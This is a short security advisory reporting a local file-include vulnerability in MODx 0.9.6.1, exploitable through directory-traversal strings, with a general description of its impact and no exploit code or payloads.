MODx is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability using directory-traversal strings to execute local script code in the context of the application. This may allow the attacker to access sensitive information that may aid in further attacks.

MODx 0.9.6.1 is vulnerable to this issue; other versions may also be affected.
